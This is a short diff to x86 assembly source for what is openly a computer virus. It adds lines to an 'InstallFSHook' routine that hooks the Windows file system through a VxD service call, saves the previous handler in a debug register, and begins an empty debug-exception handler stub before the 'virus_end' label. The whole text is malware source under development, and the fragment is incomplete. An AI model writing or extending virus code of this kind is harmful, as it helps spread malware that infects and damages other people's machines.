@@ -266,8 +266,19 @@ InstallFSHook:
 sub edi, VirusSize
 push eax
 lea eax, [edi+(IntHandler-virus_start)]
+push eax
 int 20h
 dd 00040093h
+add esp, 4h
+mov dr0, eax    ; Save the previous handler adress
+pop eax
+
+
+;**************************
+;* Debug Exception Hadler *
+;**************************
+debug_exception:
+
 
 
 virus_end:
